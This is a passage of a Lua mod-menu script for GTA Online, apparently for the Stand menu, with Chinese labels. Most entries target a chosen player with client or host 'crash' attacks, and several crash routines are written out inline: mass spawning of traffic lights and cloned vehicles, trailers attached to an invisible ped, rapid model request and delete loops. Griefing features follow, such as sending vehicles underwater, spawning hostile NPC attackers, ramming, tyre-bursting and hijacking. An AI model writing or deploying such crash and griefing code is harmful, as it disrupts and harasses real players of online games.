    menu.action(toxic_chat_crash, '恒星崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '小葡萄崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'xp亲妈献祭崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '三彩团子崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'Aurora崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '梵南崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '双叶理央崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'AKAME8崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '鸡腿崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'JUST崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'ZawY崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'px崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'LINKE崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '湿纸巾崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '马头崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '饭团崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, '维也纳在逃钢琴家崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    menu.action(toxic_chat_crash, 'Pluto崩溃', {}, '', function ()
        genercrash(PlayerID)
    end)

    toxicchatincrash = false
    menu.toggle(toxic_chat_crash, "公屏狗叫", {}, "上面10个崩溃是否开启狗叫(请不要经常用,以避免被ban)", function(on)
        toxicchatincrash = on
    end)

    local mix_crash = menu.list(PlayerMainMenu, "混合崩溃")

    nicecrash_v1 = false
    menu.toggle(mix_crash, "奥特曼崩v1", {}, "", function(on)
        nicecrash_v1 = on
    end)

    nicecrash_v2 = false
    menu.toggle(mix_crash, "奥特曼崩v2", {}, "", function(on)
        nicecrash_v2 = on
    end)

    nicecrash_v3 = false
    menu.toggle(mix_crash, "奥特曼崩v3", {}, "", function(on)
        nicecrash_v3 = on
    end)

    inshell_v1 = false
    menu.toggle(mix_crash, "因莎拉崩溃", {}, "", function(on)
        inshell_v1 = on
    end)

    proluna_v1 = false
    menu.toggle(mix_crash, "露娜崩溃", {}, "", function(on)
        proluna_v1 = on
    end)

    grief_v1 = false
    menu.toggle(mix_crash, "悲伤的耶稣崩溃", {}, "", function(on)
        grief_v1 = on
    end)

    nature_v1 = false
    menu.toggle(mix_crash, "大自然崩溃v1", {}, "", function(on)
        nature_v1 = on
    end)

    nature_v2 = false
    menu.toggle(mix_crash, "大自然崩溃v2", {}, "", function(on)
        nature_v2 = on
    end)

    sweetcrash_v1 = false
    menu.toggle(mix_crash, "泡泡糖崩溃", {}, "", function(on)
        sweetcrash_v1 = on
    end)

    cps_v1 = false
    menu.toggle(mix_crash, "绿玩保护崩溃", {}, "", function(on)
        cps_v1 = on
    end)

    fragcrash_v1 = false
    menu.toggle(mix_crash, "碎片崩溃", {}, "", function(on)
        fragcrash_v1 = on
    end)

    lestercrestcrash_v1 = false
    menu.toggle(mix_crash, "莱纳斯崩溃", {}, "", function(on)
        lestercrestcrash_v1 = on
    end)

    dongge_v1 = false
    menu.toggle(mix_crash, "董哥崩溃", {}, "", function(on)
        dongge_v1 = on
    end)

    planecrash_v1 = false
    menu.toggle(mix_crash, "美杜莎崩溃", {}, "", function(on)
        planecrash_v1 = on
    end)

    wenyi_v1 = false
    menu.toggle(mix_crash, "马桶崩溃", {}, "", function(on)
        wenyi_v1 = on
    end)

    wade_v1 = false
    menu.toggle(mix_crash, "韦德崩崩溃", {}, "", function(on)
        wade_v1 = on
    end)

    OXCrash_v1 = false
    menu.toggle(mix_crash, "OX崩", {}, "", function(on)
        OXCrash_v1 = on
    end)

    soundcrash_v1 = false
    menu.toggle(mix_crash, "声音崩v1", {}, "", function(on)
        soundcrash_v1 = on
    end)

    soundcrash_v2 = false
    menu.toggle(mix_crash, "声音崩v2", {}, "", function(on)
        soundcrash_v2 = on
    end)

    invalidmodelcrash_v1 = false
    menu.toggle(mix_crash, "无效模型崩溃", {}, "", function(on)
        invalidmodelcrash_v1 = on
    end)

    xxx5gcrash_v1 = false
    menu.toggle(mix_crash, "5g崩溃", {}, "", function(on)
        xxx5gcrash_v1 = on
    end)

    dick_v1 = false
    menu.toggle(mix_crash, "大JB崩", {}, "", function(on)
        dick_v1 = on
    end)

    ChernobogCrash_v1 = false
    menu.toggle(mix_crash, "导弹车崩溃v1", {}, "", function(on)
        ChernobogCrash_v1 = on
    end)

    ChernobogCrash_v2 = false
    menu.toggle(mix_crash, "导弹车崩溃v2", {}, "", function(on)
        ChernobogCrash_v2 = on
    end)

    huntercrash_v1 = false
    menu.toggle(mix_crash, "猎杀者", {}, "", function(on)
        huntercrash_v1 = on
    end)

    scriptevent_v1 = false
    menu.toggle(mix_crash, "脚本事件崩溃", {}, "", function(on)
        scriptevent_v1 = on
    end)

    invalidclothes_v1 = false
    menu.toggle(mix_crash, "无效外观V1", {}, "", function(on)
        invalidclothes_v1 = on
    end)

    invalidclothes_v2 = false
    menu.toggle(mix_crash, "无效外观V2", {}, "", function(on)
        invalidclothes_v2 = on
    end)

    dh_v1 = false
    menu.toggle(mix_crash, "单崩黄昏", {}, "", function(on)
        dh_v1 = on
    end)

    tuoche_v1 = false
    menu.toggle(mix_crash, "拖车崩", {}, "", function(on)
        tuoche_v1 = on
    end)

    menu.action(mix_crash, "混合崩溃", {}, "", function()
        mixx_crash(PlayerID)
    end)

    local xp_crash_trash = menu.list(PlayerMainMenu, "XP崩溃")

    menu.action(PlayerMainMenu, "改进AIO崩", {}, "远离!!!远离!!!远离!!!远离!!!", function()
        aaaio(PlayerID)
    end)

    menu.click_slider(PlayerMainMenu,"奥特曼崩(不要靠近和观看）", {"nicecrash"}, "1 = V1, 2 = V2, 3 = V3", 1, 3, 1, 1, function(on_change)
        
        if on_change == 1 then		
            aotemanv1(PlayerID)
        end
        if on_change == 2 then
            aotemanv2(PlayerID)
        end
        if on_change == 3 then
            aotemanv3(PlayerID)
        end   
    end)

    menu.action(PlayerMainMenu, "因莎拉崩溃", {"inshell"}, "", function()
        inshellcrash(PlayerID)
    end)



    menu.action(PlayerMainMenu, "载具崩溃", {}, "", function()
        local pCoords<const> = players.get_position(PlayerID)
        local trafficLights = {}

        util.request_model(-655644382) -- traffic lights
        for i = 1, 20 do
            local object<const> = entities.create_object(-655644382, v3.new(pCoords.x + math.random(-5, 5), pCoords.y + math.random(-5, 5), pCoords.z + math.random(-1, 0)))
            ENTITY.SET_ENTITY_ROTATION(object, 0, 0, math.random(0, 360), 1, true)
            trafficLights[#trafficLights + 1] = object
        end

        local stopLights = false

        util.create_tick_handler(function()
            if stopLights then
                return false
            end
            ENTITY.SET_ENTITY_TRAFFICLIGHT_OVERRIDE(trafficLights[math.random(1, #trafficLights)], math.random(0, 3))
        end)

        util.request_model(3253274834) -- buffalo
        local vehicles = {}
        local crashVehicle<const> = entities.create_vehicle(3253274834, pCoords, 0)
        vehicles[#vehicles + 1] = crashVehicle
        VEHICLE.SET_VEHICLE_MOD_KIT(crashVehicle, 0)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(crashVehicle, "ICRASHU")
        VEHICLE.SET_VEHICLE_MOD(crashVehicle, 34, 3)
        for i = 1, 10 do
            vehicles[#vehicles + 1] = clone(crashVehicle)
        end

        util.yield(3000)
        for i = 1, #vehicles do
            entities.delete_by_handle(vehicles[i])
        end

        util.yield(5000)
        stopLights = true
        util.yield(500)
        for i = 1, #trafficLights do
            entities.delete_by_handle(trafficLights[i])
        end

        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(3253274834)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(-655644382)
    end)

    menu.action(xp_crash_trash, "制裁XP V1", {"crashxpv1"}, "", function()
        menu.trigger_commands("crash " .. players.get_name(PlayerID))
        menu.trigger_commands("smash " .. players.get_name(PlayerID))
    end)

    menu.action(xp_crash_trash, "制裁XP V2", {"crashxpv2"}, "", function()
        local cord = players.get_position(PlayerID)
        local a1 = entities.create_object(-930879665, cord)
        local a2 = entities.create_object(3613262246, cord)
        local b1 = entities.create_object(452618762, cord)
        local b2 = entities.create_object(3613262246, cord)
        for i = 1, 10 do
            util.request_model(-930879665)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(452618762)
            util.yield(300)
            entities.delete_by_handle(a1)
            entities.delete_by_handle(a2)
            entities.delete_by_handle(b1)
            entities.delete_by_handle(b2)
            util.request_model(452618762)
            util.yield(10)
            util.request_model(3613262246)
            util.yield(10)
            util.request_model(-930879665)
            util.yield(10)
        end
        util.toast("完成.")
    end)

    menu.action(xp_crash_trash, "制裁XP v3", {"crashxpv3"}, "", function()
        menu.trigger_commands("planecrash " .. players.get_name(PlayerID))
        menu.trigger_commands("wenyi " .. players.get_name(PlayerID))
        menu.trigger_commands("ChernobogCrash " .. players.get_name(PlayerID).. " 1")
        menu.trigger_commands("tuoche " .. players.get_name(PlayerID))
        menu.trigger_commands("dh " .. players.get_name(PlayerID))
    end)

    menu.action(xp_crash_trash, "制裁XP pro max", {"crashxppromax"}, "", function()
        menu.trigger_commands("ghostcrashv2 " .. players.get_name(PlayerID))
    end)

        menu.action(PlayerMainMenu, "新鬼崩", {"ghostcrashv2"}, "", function()
            local model_array = {util.joaat("boattrailer"),util.joaat("trailersmall"),util.joaat("raketrailer"),}
                    local BAD_attach = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
                    local fuck_ped = CreatePed(26 , util.joaat("ig_kaylee"), BAD_attach, 0)
                    ENTITY.SET_ENTITY_VISIBLE(fuck_ped, false)
                    for i = 1, 3, 1 do
                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fuck_ped, BAD_attach.x, BAD_attach.y, BAD_attach.z)
                        for spawn, value in pairs(model_array) do
                            local vels = {}
                            vels[spawn] = CreateVehicle(value, BAD_attach, 0)
                            for attach, value in pairs(vels) do
                                ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value, fuck_ped, 0, 0, true, true)
                            end
                        end
                        util.yield(500)
                        menu.trigger_commands("explode" ..  players.get_name(PlayerID))
                    end
    end)

    menu.action(PlayerMainMenu, "新鬼崩", {"ghostcrashv2"}, "", function()
        local model_array = {util.joaat("-1081538054"),util.joaat("-1398962413"),util.joaat("-1744853985"),}
                local BAD_attach = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID))
                local fuck_ped = CreatePed(26 , util.joaat("ig_kaylee"), BAD_attach, 0)
                ENTITY.SET_ENTITY_VISIBLE(fuck_ped, false)
                for i = 1, 3, 1 do
                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(fuck_ped, BAD_attach.x, BAD_attach.y, BAD_attach.z)
                    for spawn, value in pairs(model_array) do
                        local vels = {}
                        vels[spawn] = CreateVehicle(value, BAD_attach, 0)
                        for attach, value in pairs(vels) do
                            ENTITY.ATTACH_ENTITY_BONE_TO_ENTITY_BONE_Y_FORWARD(value, fuck_ped, 0, 0, true, true)
                        end
                    end
                    util.yield(500)
                    menu.trigger_commands("explode" ..  players.get_name(PlayerID))
                end
end)

    menu.action(PlayerMainMenu, "test", {""}, "", function(train_loop)
        local stupid_pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID)) stupid_pos.z = stupid_pos.z + 1
        util.create_thread(function ()
            local mod_vel = {184361638,642617954,586013744,920453016,3186376089,1030400667,240201337}
                for _spawn, value in pairs(mod_vel) do
                    local s = {}
                    for i = 1, 7, 1 do  
                        s[_spawn] = CreateVehicle(value,stupid_pos,0)
                        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Entity, true, false)
                        util.yield(0)
                        end
                    end
                    util.yield(8000)
                    local ar_vs = entities.get_all_vehicles_as_handles()
                    for key, value in pairs(ar_vs) do
                    entities.delete_by_handle(value)
                end
            end,nil)
        end)

    menu.action(PlayerMainMenu, "改进露娜崩溃", {"proluna"}, "", function(state)   
        lunacrash(PlayerID)
    end)

    menu.action(PlayerMainMenu, "大自然崩溃", {"nature"}, "", function()
        naturecrashv1(PlayerID)
    end)
    
    menu.action(PlayerMainMenu, "大自然崩溃 v2", {"hiroshima"}, "", function()
        naturecrashv2(PlayerID)
    end)
    
    menu.action(PlayerMainMenu, "悲伤的耶稣崩溃", {"grief"}, "可以崩溃大多数菜单.", function()
        greifcrash(PlayerID)
    end)

    menu.action(PlayerMainMenu, "泡泡糖崩溃", {"sweetcrash"}, "", function()
        sugercrash(PlayerID)
    end)

    menu.action(PlayerMainMenu, "绿玩保护崩溃", {"cps"}, "尽量不要靠得太近!", function()
        cpscrash(PlayerID)
    end)

    menu.toggle(PlayerMainMenu, "碎片崩溃", {"fragcrashclick"}, "2Take1同款崩溃", function()
        fragmentcrash(PlayerID)
    end)

    menu.toggle_loop(PlayerMainMenu, "循环碎片崩溃", {"fragcrash"}, "2Take1同款崩溃", function()
        fragmentcrash(PlayerID)
    end)

    menu.action(PlayerMainMenu, "莱纳斯崩溃", {"lestercrestcrash"}, "", function()
        lestcrash(PlayerID)
    end)

    menu.action(PlayerMainMenu, "董哥崩溃", {"dongge"}, "", function()
    dongge(PlayerID)
    end)

    menu.action(PlayerMainMenu, "美杜莎崩溃", {"planecrash"}, "", function() 
    MDS(PlayerID)
    end)
    
    menu.action(PlayerMainMenu,"马桶崩溃", {"wenyi"}, "", function()
    toiletcrash(PlayerID)
	end)

    menu.action(PlayerMainMenu, "韦德崩", {"wade"}, "", function() 
    wadecrash(PlayerID)
    end)
    
    menu.action(PlayerMainMenu, "OX崩v1", {"OXCrash"}, "远离!!!远离!!!远离!!!远离!!!远离!!!远离!!!", function()
        OXcrashgg(PlayerID)
    end)

    menu.toggle_loop(PlayerMainMenu, "OX崩v2", {"OXCrashv2"}, "远离!!!远离!!!远离!!!远离!!!远离!!!远离!!!", function()
        OXcrashggv2(PlayerID)
    end)
  
        menu.click_slider(PlayerMainMenu,"声音崩（不要连点）", {"sound crash"}, "1 = V1, 2 = V2", 1, 2, 1, 1, function(on_change)
            if on_change == 1 then	
                soundcrashv1(PlayerID)
            end   
            if on_change == 2 then
                soundcrashv2(PlayerID)
            end
        end)
    
        menu.action(PlayerMainMenu, "无效模型崩溃", {"invalidmodelcrash"}, "", function()
            wxcrash(PlayerID)
        end)
        
        menu.action(PlayerMainMenu, "5g崩溃", {"5gcrash"}, "5gcrash", function()
            x999gcrash(PlayerID)
        end)
        
        menu.action(PlayerMainMenu, "大JB崩", {"dick"}, "dick", function()
            suckmydick(PlayerID)
        end)
    
        menu.click_slider(PlayerMainMenu,"导弹车崩溃", {"Chernobog Crash"}, "1 = V1, 2 = V2", 1, 2, 1, 1, function(on_change)
            if on_change == 1 then	
                daodanchev1(PlayerID) 
            end
            if on_change == 2 then	
                daodanchev2(PlayerID)
            end
    end)

        menu.action(PlayerMainMenu, "猎杀者", {"huntercrash"}, "Hunter Crash", function()
            huntercrash(PlayerID)
        end)
    
        menu.action(PlayerMainMenu, "脚本事件崩溃", {"scriptevent"}, "", function()
            scriptcrash(PlayerID)
        end)
    
        menu.action(PlayerMainMenu, "无效外观V1", {"invalidclothesv1"}, "", function()
            BadOutfitCrashV1(PlayerID)
        end)
            
            menu.action(PlayerMainMenu, "无效外观V2", {"invalidclothesv2"}, "", function ()
            BadOutfitCrashV2(PlayerID)
        end)

        menu.action(PlayerMainMenu, "单崩黄昏", {"dh"}, "", function()
            dhcrash(PlayerID)
            end)
    
        menu.action(PlayerMainMenu, "拖车崩", {"tuoche"}, "tuoche", function()
            tuocheb(PlayerID)
        end)
    
        menu.action(PlayerMainMenu, "主机崩", {}, "崩溃主机（请提前把主机优先级为最低）", function(PlayerID)
            hostcrash(PlayerID)
        end)
            
        menu.action(PlayerMainMenu, "鬼崩（切战局自崩）", {}, "遇事不决就用鬼崩", function()
            guibeng(PlayerID)
        end)
        
            menu.action(PlayerMainMenu,"TP", {""}, "传送到玩家", function()
            tpplayer(PlayerID)
        end)	   
    
    end	

    players.on_join(GenerateFeatures)

    local function playerActionsSetup(pid) 

    local playerMain = menu.list(menu.player_root(pid), "恶搞", {""}, "")

    local playerOtherTrolling = menu.list(playerMain, "载具恶搞", {}, "")

    local player_veh_teleport = menu.list(playerOtherTrolling, "传送载具", {}, "")

    menu.action(player_veh_teleport, "传送载具到我", {"tpvtome"}, "如果这不起作用，它不是一个bug", function(on_click)
        tpcartome(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到导航点", {"tpvtoway"}, "如果这不起作用，它不是一个bug", function(on_click)
        tocartopoint(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到花园银行停机坪", {"tpvtomaze"}, "如果这不起作用，它不是一个bug", function(on_click)
        tptomaze(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到深海底", {"tpvunderwater"}, "如果这不起作用，它不是一个bug", function(on_click)
        tptounderwater(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到高空", {""}, "", function()
        tptohighair(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到洛圣都改车王", {"tpvlsc"}, "如果这不起作用，它不是一个bug", function(on_click)
        tolsc(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到监狱SCP-173单元", {"tpvscp"}, "如果这不起作用，它不是一个bug", function(on_click)
        tpscp(pid)
    end)

    menu.action(player_veh_teleport, "传送载具到大牢房中", {"tpvcell"}, "如果这不起作用，它不是一个bug", function(on_click)
        tocell(pid)
    end)

    local trolly_Vehicles = menu.list(playerOtherTrolling, "恶搞载具", {}, "")

	menu.textslider(trolly_Vehicles, "发送恶搞载具", {}, "", {"Bandito", "Go-Kart"}, function (index, opt)
		send_veh_attack(opt, index, pid)
	end)

	menu.toggle(trolly_Vehicles, "无敌的", {}, "",function(toggle) 
        send_veh_attack_god(toggle)
    end)

	menu.action(trolly_Vehicles, "派武装匪徒", {}, "", function()
        send_veh_attacker(pid)
	end)

	menu.textslider_stateful(trolly_Vehicles, "匪徒武器", {}, "", {util.get_label_text("BAND_BOMB"), util.get_label_text("TOP_MINE")}, function (index, value)
        send_veh_attacker_weapon(index, value)
	end)

	mineSlider = menu.textslider_stateful(trolly_Vehicles, "地雷", {}, "", {util.get_label_text("KINET_MINE"), util.get_label_text("EMP_MINE")}, function (index, value)
		send_veh_attacker_weapon_mine(index, value)
	end)

	menu.slider(trolly_Vehicles, "数量", {}, "", 1, 10, 1, 1, function(value)
        send_veh_attacker_number(value)
    end)

	menu.action(trolly_Vehicles, "删除", {}, "", function()
        dele_all_veh_attacker()
	end)

	menu.set_visible(mineSlider, false)

    local enemyVehiclesOpt = menu.list(playerOtherTrolling, "敌对载具", {}, "")

	menu.textslider(enemyVehiclesOpt, "派遣敌对载具", {}, "", {"Minitank", "Buzzard", "Lazer"}, function(index, option)
        veh_attacker_spawn(pid, index, option)
	end)

	menu.textslider_stateful(enemyVehiclesOpt, "迷你坦克武器", {}, "", {util.get_label_text("WT_V_PLRBUL"),util.get_label_text("MINITANK_WEAP2"),util.get_label_text("MINITANK_WEAP3"),}, function(index)
        mintank_weapon(index)
	end)

	menu.textslider_stateful(enemyVehiclesOpt, "枪手的武器", {}, "", {util.get_label_text("WT_MG"), util.get_label_text("WT_RPG")}, function(index)
		gunner_weapon(index)
	end)

	menu.slider(enemyVehiclesOpt, "数量", {}, "",1, 10, 1, 1, function (value)
        veh_attacker_spawn_count(value)
    end)

	menu.toggle(enemyVehiclesOpt, "无敌", {}, "",function(toggle)
        veh_attacker_spawn_god(toggle) 
    end)

	menu.action(enemyVehiclesOpt, "删除", {}, "", function()
        dele_veh_attacker()
	end)

    local cplaym = menu.list(playerOtherTrolling, '载具攻击', {}, '')

    local vehaloop =  menu.toggle_loop(cplaym, '载具攻击', {'SmashPla'},'使玩家无法站起来', function ()
        vehpushandhit(pid)
     end)
 
     menu.set_value(vehaloop, nil)
 
     menu.toggle(cplaym, '隐形载具', {}, '将攻击载具更改为不可见', function (on)
        vehhitcantsee(on)
     end)

     local cclist = menu.list(cplaym, '更改为用于载具攻击的载具', {}, '')
     menu.list_action(cclist, '载具列表', {''}, '更改为用于载具攻击的载具', Vehlist, function(vehsel)
        vehaset.vehasel = util.joaat(Vehha[vehsel])
     end)
 
     menu.slider(cplaym, '攻击频率', {'assaultrate'}, '调整载具攻击频率', 100, 4000, 1000, 100, function (ar)
         vehaset.vehra = ar
      end)

     menu.text_input(cclist, '输入自定义载具模型名', {'cussmash'}, '输入车辆模型名以更改载具为攻击载具', function(cussma)
        if STREAMING.IS_MODEL_A_VEHICLE(util.joaat(cussma)) then
            vehaset.vehasel = util.joaat(cussma)
         else
            if set.alert then
                util.toast('载具名称不正确(请检查你的拼写)')
            end
         end
 end, 'toreador')

 menu.list_action(playerOtherTrolling, "附加", {}, "", {"到他的车", "他的车到我的车", "我的车到他的车", "分离"}, function(index, value, click_type)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
    if car ~= 0 then
        request_control_of_entity(car)
        pluto_switch index do
            case 1: 
                ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), car, 0, 0.0, -0.20, 2.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                break 
            case 2: 
                if player_cur_car ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(car, player_cur_car, 0, 0.0, -5.00, 0.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                end
                break
            case 3: 
                if player_cur_car ~= 0 then
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(player_cur_car, car, 0, 0.0, -5.00, 0.00, 1.0, 1.0,1, true, true, true, false, 0, true)
                end
                break

            case 4: 
                ENTITY.DETACH_ENTITY(car, false, false)
                if player_cur_car ~= 0 then
                    ENTITY.DETACH_ENTITY(player_cur_car, false, false)
                end
                ENTITY.DETACH_ENTITY(players.user_ped(), false, false)
                break
        end
    end
end)

    menu.textslider(playerOtherTrolling, "神风敢死队", {}, "", {"Lazer", "Mammatus",  "Cuban800"}, function (index, plane)
        planedied(pid, index, plane)
    end)

    menu.toggle_loop(playerOtherTrolling, "敌对交通--周围的车撞他", {}, "", function()
        nearcarkill(pid)
    end)

    menu.list_action(playerOtherTrolling, "门控", {}, "", {"打开", "关闭", "打破"}, function(index, value, click_type)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local d = VEHICLE.GET_NUMBER_OF_VEHICLE_DOORS(car)
            for i=0, d do
                pluto_switch index do
                    case 1: 
                        VEHICLE.SET_VEHICLE_DOOR_OPEN(car, i, false, true)
                        break
                    case 2:
                        VEHICLE.SET_VEHICLE_DOOR_SHUT(car, i, true)
                        break
                    case 3:
                        VEHICLE.SET_VEHICLE_DOOR_BROKEN(car, i, false)
                        break
                end
            end
        end
    end)

    menu.action(playerOtherTrolling, "载具无敌", {}, "", function(click_type)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            ENTITY.SET_ENTITY_INVINCIBLE(car, true)
            VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(car, false)
        end
    end)

    menu.click_slider(playerOtherTrolling, "载具最高速度", {}, "", -10000, 10000, 200, 100, function(s)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            VEHICLE.MODIFY_VEHICLE_TOP_SPEED(car, s)
            ENTITY.SET_ENTITY_MAX_SPEED(car, s)
        end
    end)

    menu.toggle(playerOtherTrolling, "隐形载具", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            if on then
                ENTITY.SET_ENTITY_ALPHA(car, 255)
                ENTITY.SET_ENTITY_VISIBLE(car, false, 0)
            else
                ENTITY.SET_ENTITY_ALPHA(car, 0)
                ENTITY.SET_ENTITY_VISIBLE(car, true, 0)
            end
        end
    end)

    menu.toggle(playerOtherTrolling, "手刹", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            VEHICLE.SET_VEHICLE_HANDBRAKE(car, on)
        end
    end)

    menu.toggle_loop(playerOtherTrolling, "随机制动", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            VEHICLE.SET_VEHICLE_HANDBRAKE(car, true)
            util.yield(1000)
            request_control_of_entity(car)
            VEHICLE.SET_VEHICLE_HANDBRAKE(car, false)
            util.yield(math.random(3000, 15000))
        end
    end)

    menu.toggle(playerOtherTrolling, "冻结", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            speed = if on then 0.0 else 1000.0
            ENTITY.SET_ENTITY_MAX_SPEED(car, speed)
        end
    end)

    menu.action(playerOtherTrolling, "爆胎", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            for i=0, 7 do
                VEHICLE.SET_VEHICLE_TYRE_BURST(car, i, true, 1000.0)
            end
        end
    end)

    menu.action(playerOtherTrolling, "将载具调头", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local rot = ENTITY.GET_ENTITY_ROTATION(car, 0)
            local vel = ENTITY.GET_ENTITY_VELOCITY(car)
            ENTITY.SET_ENTITY_ROTATION(car, rot['x'], rot['y'], rot['z']+180, 0, true)
            ENTITY.SET_ENTITY_VELOCITY(car, -vel['x'], -vel['y'], vel['z'])
        end
    end)

    menu.action(playerOtherTrolling, "翻转车辆", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local rot = ENTITY.GET_ENTITY_ROTATION(car, 0)
            local vel = ENTITY.GET_ENTITY_VELOCITY(car)
            ENTITY.SET_ENTITY_ROTATION(car, rot['x'], rot['y']+180, rot['z'], 0, true)
            ENTITY.SET_ENTITY_VELOCITY(car, -vel['x'], -vel['y'], vel['z'])
        end
    end)

    menu.action(playerOtherTrolling, "关掉引擎", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true)
        if car ~= 0 then
            request_control_of_entity(car)
            VEHICLE.SET_VEHICLE_ENGINE_ON(car, false, true, false)
        end
    end)

    menu.action(playerOtherTrolling, "删除载具", {}, "删除此玩家正在驾驶的载具", function()
        deleplayercar(pid)
    end)

    menu.action(playerOtherTrolling, "踢出载具", {}, "", function(toggled)
        kickcar(pid)
    end)

	menu.action(playerOtherTrolling, "变成小恐龙", {""}, "", function(on_click)
        changemodel(pid)
    end)
	
	menu.action(playerOtherTrolling, "传送载具到我", {""}, "", function(on_click)
        tpcartomv2(ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), true))
    end)

    menu.action(playerOtherTrolling, "将墙放在玩家面前", {}, "在玩家面前放置墙壁,半秒后删除", function ()
        qfmq(pid)
    end)

    menu.textslider_stateful(playerOtherTrolling, "劫持车辆", {"hijack"}, "随机 NPC 劫持他们的车辆", jclll, function(hijackLevel)
        gethimcar(pid)
    end)

    menu.toggle(playerOtherTrolling, "随机升级", {"upgradevehicle"}, "", function(state)
        abcd = state
    while abcd do
        randomupdatcar(pid)
    util.yield(500)
        end
    end)

    menu.toggle_loop(playerOtherTrolling, "让他以为自己能走", {""}, "假象", function ()
        letcarlagging(pid)
    end)

    glitchVehCmd = menu.toggle(playerOtherTrolling, "鬼畜载具", {"glitchvehicle"}, "", function(toggle)
        glitchcar(toggle, pid)
    end)

    menu.toggle_loop(playerOtherTrolling, "快乐的小陀螺", {"beybladev"}, "", function(on)
        carspin(pid)
    end)

    menu.action(playerOtherTrolling, "电磁脉冲炸弹", {"empvehicle"}, "", function(on)
        caremp(pid)
    end)

    local npctrolls_root = menu.list(playerMain, "NPC恶搞", {"npctrolls"}, "")

	local attacker_trolling = menu.list(npctrolls_root, "攻击者选项", {}, "")

	ModelList.new(attacker_trolling, "生成攻击者", "", "", attackerList, function (caption, model)
        spawn_attacker(pid, caption, model)
	end, false, false)


	menu.action(attacker_trolling, "克隆玩家（敌人)", {}, "", function()
        spawn_attacker_own(pid)
	end)

